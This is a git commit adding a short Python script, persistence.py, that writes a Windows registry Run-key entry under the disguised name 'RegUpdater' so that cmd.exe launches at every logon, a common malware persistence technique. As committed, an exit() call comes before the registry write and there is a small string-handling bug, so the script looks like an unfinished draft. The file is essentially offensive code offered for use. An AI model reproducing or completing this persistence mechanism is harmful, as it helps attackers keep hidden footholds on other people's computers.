74befdfb7c0e2980304f68df9ec8d4c025dc9887
mrlongsword <60816759+mrlongsword@users.noreply.github.com>
2022-06-12 13:22:36 +0800

    Update persistence.py

--- persistence/persistence.py
+++ persistence/persistence.py
@@ -1,1 +1,15 @@
+import os # needed for getting working directory
+import shutil # needed for file copying
+import subprocess # needed for getting user profile
+import winreg as wreg # needed for editing registry DB
+path = os.getcwd().strip('/n')
+print(path)
+destination = os.getenv('userprofile').strip('\n\r') + '\\Documents\\'
+print(destination)
 
+target = "C:\WINDOWS\system32\cmd.exe"
+print(target)
+exit()
+key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
+wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,target)
+key.Close()
